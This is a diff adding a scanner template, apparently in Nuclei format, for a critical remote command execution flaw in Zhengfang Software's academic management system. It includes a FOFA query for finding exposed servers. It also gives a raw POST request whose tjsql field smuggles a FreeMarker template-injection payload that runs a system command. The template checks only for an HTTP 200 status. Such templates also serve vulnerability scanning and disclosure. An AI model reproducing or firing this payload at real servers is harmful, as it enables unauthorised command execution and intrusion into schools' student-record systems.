@@ -1,0 +1,26 @@
+id: poc-hq8unoa0dh2wn9p4
+info:
+  name: 正方软件股份有限公司教务系统zdytj_cxParserColumnWhithSQL2存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hq8unoa0dh2wn9p4'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hq8unoa0dh2wn9p4
+    fofa: body="正方软件股份有限公司" && title="教学管理信息服务平台"
+http:
+- raw:
+  - 'POST /zdytj/zdytj_cxParserColumnWhithSQL2.html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    tjsql=select ''<#assign x="freemarker.template.utility.Execute"?new()><#assign r=x("id")>'' col_${r?replace("[^a-zA-Z0-9]","_","r")} from dual'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
